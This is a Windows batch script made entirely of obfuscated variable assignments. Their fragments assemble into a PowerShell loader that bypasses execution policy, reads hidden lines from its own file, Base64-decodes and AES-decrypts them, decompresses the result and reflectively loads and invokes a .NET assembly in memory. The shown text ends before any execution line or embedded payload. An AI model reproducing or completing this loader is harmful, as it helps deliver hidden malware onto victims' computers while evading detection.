@echo off
set "KvQrnljYIP=EoO "
set "mrqKQDdJbC=le  "
set "UXCTJxErDY=('%~f0'"
set "xLyRRxJWEN=106u"
set "SQkofGusaz=ke($"
set "daPSETayvY=[-1."
set "EXrdfksxyR=L4Yi"
set "IZlnYJKcDY=.Ass"
set "bEjHazPbLK=[IO."
set "zbWkxiQPKE=oint"
set "YLHFhUrgDX=ach "
set "ZxnMguvVhU=);$O"
set "SGAndljNzv=rans"
set "KhxgwvCPsP= New"
set "XkYIXgKXdQ=U, 0"
set "vAJXAGiOSP=16] "
set "XGmPXxcvks=onve"
set "bXHyATMDUa=ewLi"
set "DpnfiPwFkI=rOH."
set "dzevNReiun=fore"
set "fTRSQbrtJc=[Sys"
set "GxqYCPaTAS=ct S"
set "sqJRKUEGAy=.Cry"
set "lKRwSXRnHh=oU ="
set "rhoSMVXgux=and "
set "DjphOFCvKY=wooU"
set "RuSICCYgmT=, $U"
set "AeDaFMRueT=QiNC"
set "fCoyzHCayh=pher"
set "axnWHyfUkk=nage"
set "gQJoVQzNUJ=();$"
set "fOVTzFTAJu=.Cop"
set "jJTMDsLUBr=gsYZ"
set "IqseHeNMnT=Obje"
set "wLcrnNrqag=:: '"
set "efgtaBUCpO=ecry"
set "ZbzzKMmyLz=[Sys"
set "oxBXoApANH='[-1"
set "EsSjwqHoMJ=ose("
set "luZUInqJWt=fOnC"
set "SVWoOjYoLZ=rity"
set "zojHREvFUN=Syst"
set "hfpbHmhRXi=)))"
set "eHtcIQveKH=ck($"
set "mbZgarKZwI=.Mem"
set "kqFExfkfoz=::De"
set "lszCDcXjjf=] -j"
set "VOIelqPuOr=KI ="
set "LOrLbMUHdb=ring"
set "cQJAnhnbIJ=]::("
set "fZecNzPrsn= = N"
set "BAmwfTnOlC=-1.."
set "QGWewSoOmY=Disp"
set "wprWBgZBAr=ress"
set "ilokAPjYPd=esMa"
set "idnqSxYqCc=$cFI"
set "JWEjnIWaNl=Invo"
set "sTXoWnZTtI=yste"
set "JWcXflvDps=null"
set "JfrZyAlTzj=oin "
set "tvkqBWgykL=tion"
set "QumCsCqIWP=brea"
set "qiDqpUIWOK=Sr, "
set "uCbQGfyeRs=ion."
set "hZLAQQKNHR=-ep "
set "IBFRJdHGDZ=y.Ci"
set "BKmgKaUoWQ=vert"
set "wxNZCHIDWw=join"
set "vcbWTvELdd=ne);"
set "foefZQUDZj=Mode"
set "ojYgFVzYlW=em.C"
set "MlrEZQrDoh=zuZI"
set "MrujqtvavK=bypa"
set "GOLwbvImcD=y]::"
set "jqzzHHyJiT=Comp"
set "WWKBeJVhHb= '')"
set "OVACTdfDVl=eMVs"
set "IPovfBsNlh=ing("
set "LbMxnWgeYn=;$Yy"
set "aSPMYQkVKZ=);$O"
set "vGAHAnTgpw=RgEh"
set "PsVMOLmeEd=F'[-"
set "LxIpJvyevb=fOnC"
set "goPVTUQMaL=xk.T"
set "yOmbqgKXXb=CFxo"
set "UxvyrZYTUB=..-1"
set "SBwfRBIynn=raph"
set "TvHhnHjycO= = $"
set "KHLRSYrkkJ=$YyP"
set "TuaEUPHCsa=:('g"
set "FyyONlweIS=.Dis"
set "boVQhMEmRw=-joi"
set "FvBZuZvkky=comm"
set "jrNTGNBiiB=Stre"
set "lIOlczghSk=-Obj"
set "MPvmibHBRd=l5E7"
set "cQtjMrzgKw=('da"
set "JjSWcRBVfA=  $v"
set "HyLDPGGxAM=zHhH"
set "XmSgRoDMdD=$Uwo"
set "SvMQlZYgyj=.Con"
set "IsRayclohs=.Dis"
set "LQTkuprvXg=1] -"
set "hhYjPzDQJb=tem."
set "pCEMXbQasA=iNCy"
set "eKUhviSjEK=)($U"
set "lNMMDVXHBB=xk);"
set "grOwUVcHHO=fOnC"
set "DylOvBHBJT=ZjcF"
set "VNbNNoJYmi=)($v"
set "jQMlOOKfod=nC.I"
set "HbYmxUJKeC=.Len"
set "IKBIWFkGdM=Uwoo"
set "RDdONcyPAH=eam("
set "QzdksdmhQH=orF'"
set "oNaSvQAlgI=se()"
set "URbpzTtQBi=tryP"
set "tFWfkSpyEa=..-1"
set "QawSOadmsy=urit"
set "XbfNPGzQZw=n ''"
set "PqPsrDwUCm=ose("
set "qSqRKKYTZI=bstr"
set "ufmSRcBymH=r = "
set "cgQZGgztwu=xk ="
set "ZCRZjhIZLE=rOH "
set "MiOtFovSyj=$LUr"
set "gXqArhxZAf=hy.A"
set "tRsZAjTroh=mory"
set "coFtUfhslK=arF."
set "WiIKEdMfrM=ZUEo"
set "ifjAZnFwos=wooU"
set "dxhfHkZpWy=cFIK"
set "hEnRqSDIuR='txe"
set "AlLCWzWicH=form"
set "nbWmrWIhzX=$Uwo"
set "yZUUNZskYG=t Sy"
set "ksiUKZnZPQ=Fina"
set "BjAPLIOIUO=6] -"
set "VmLsVksYBj=();$"
set "PRyhoAkBsj='gni"
set "ZXhgxxzoHt=ew-O"
set "MsZbbBEWdS=n ''"
set "fCXlLunlPw=tS46"
set "cKwmyUjnES=rtS4"
set "WXrEjaRUva= [Sy"
set "inTOElvtFt=tem."
set "TobKNgiwsg=Disp"
set "oZgGOwhPtw=k; }"
set "yuANyfHBqu=lBlo"
set "DnwIpZkwNE=;$se"
set "GcXLIWOyde=1..-"
set "YuBmISvfaz=ode]"
set "XXUwDdNLaT=3); "
set "fkpLBGwzdR=tem."
set "UjRDRzCBcN=esaB"
set "tbGyVfExQo=PSr."
set "eDcybNvCYf=ptog"
set "asBmxOumls=O.Me"
set "eklxQAfPrw=pStr"
set "aBfNZSbuJt=nirt"
set "mmeJHXecHC=New-"
set "KJauXNUVeD=ss -"
set "BrtJzOUQUs=;$LU"
set "dqZYndtdqi=iron"
set "NNZIYhqmBb=ert]"
set "wNIHWYohdA='[-1"
set "iTvMuQejSQ=ZjcF"
set "uIVbTJKtTS=.Mod"
set "sDfeLpZUri=.Key"
set "vSAPzokpYi=($Rg"
set "lOorgCCkNv=yste"
set "bRuEGBiQcr=U = "
set "ByVQzZPaLw=.-16"
set "fxaTPHakCB=gth)"
set "hTdZdkfJRv=6esa"
set "wNaoVsiMbC=.Sec"
set "twyQxYspMN=gjYA"
set "AarPXJEIGK=y = "
set "ovbMqRzTrL=;$LU"
set "fkGVhJfDBB=-nop"
set "bfvUjQJSNP= if "
set "fLGkfOrOVu=gMod"
set "zFdWmXBEXV=7;$O"
set "hiTBHaypLX=pose"
set "rfRGPmvBtK=yTo("
set "UsteikobWr=raph"
set "JDEJTdnEZj=ptor"
set "EBRFsNczKM=;$ZU"
set "eDnWUaShDU=e]::"
set "EwupSchaPA=stem"
set "urxoUKjPWD=Secu"
set "RYEdRivuPU=ment"
set "luyCSKapWr= '')"
set "iHknpOenHB=ptog"
set "HTjzFEIqna=oL'["
set "qzzoHqtOuY=earF"
set "WVMkUdbKxt=ect "
set "fDrdzXnqXp=File"
set "ekAlWmwxiy=TllA"
set "YxtfunnSVn=('Tg"
set "kFyAVBQclS=rity"
set "JTlktJFUTI=O.En"
set "sGjZeXPevY=$OfO"
set "CpVUGKTJAQ===')"
set "QGiwQEHKfU=grap"
set "nlwuvKBnpC='0Pg"
set "IiOdKuzpBW=y.Pa"
set "obXPPIzZYt=);$s"
set "baQydLZFZv=ypto"
set "gVGVPzqobr=U = "
set "iQwLbdKCDT=gnir"
set "iwFNqspWdG=trea"
set "POBHvCikhX=stem"
set "tKEBexPiSk=th('"
set "FjrQjEtecT=ispo"
set "yOThDfxfry=Uwoo"
set "xpgPAmgBWp=);$x"
set "mtLvkumktx=[]] "
set "EfViGzJcyI=ay()"
set "fsugoohQkh=Secu"
set "jTCHkWRWDD=).Sp"
set "tTFaVXLJdU=oryS"
set "BgBgERplgT=tsWi"
set "cUYVvaNNCM=ateD"
set "vtDsHBTmLJ=EhJ "
set "vCZzxEjbfM=V = "
set "jeGuMZjbIV=C.Pa"
set "jUFIgIaNyT=ress"
set "RzQMSklsPn=YxVw"
set "MPlZSwaKiT=$xWW"
set "ayDZUHJnvH=, (,"
set "ChmWGrEmLs='')("
